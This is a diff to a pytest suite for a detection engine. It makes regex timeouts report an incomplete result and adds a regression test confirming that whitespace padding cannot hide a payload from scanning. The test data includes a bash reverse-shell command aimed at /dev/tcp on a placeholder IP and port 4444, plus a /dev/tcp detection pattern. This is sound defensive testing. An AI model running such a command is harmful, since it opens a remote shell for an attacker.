@@ -11,7 +11,7 @@ import time
 
 import pytest
 
-from sentinel.detection.evaluator import evaluate_condition, resolve_field
+from sentinel.detection.evaluator import EvaluationIncomplete, evaluate_condition, resolve_field
 from sentinel.detection.schema import Condition
 
 
@@ -131,11 +131,22 @@ class TestReDoSResistance:
         evil = {"m": "a" * 80 + "!"}
 
         start = time.perf_counter()
-        result = evaluate_condition(condition, evil)
+        with pytest.raises(EvaluationIncomplete):  # unknown, not "no match"
+            evaluate_condition(condition, evil)
         elapsed = time.perf_counter() - start
 
-        assert result is False
         assert elapsed < 1.0, f"regex took {elapsed:.2f}s — timeout did not fire"
+
+    @pytest.mark.security
+    @pytest.mark.parametrize("pad", ["before", "after"])
+    def test_padding_cannot_push_a_payload_out_of_reach(self, pad: str) -> None:
+        # Regression: only the first 8 KiB were scanned, so 8,200 spaces in
+        # front of a payload hid it. Values are scanned whole up to 16 KiB and
+        # by head and tail beyond that.
+        condition = Condition.model_validate({"field": "m", "op": "regex", "value": r"/dev/tcp/\d"})
+        payload, padding = "bash -c 'exec 5<>/dev/tcp/203.0.113.7/4444'", " " * 50_000
+        value = padding + payload if pad == "before" else payload + padding
+        assert evaluate_condition(condition, {"m": value}) is True
 
     def test_invalid_pattern_degrades_to_false(self) -> None:
         # A pattern that fails to compile (loader guards against this, but the
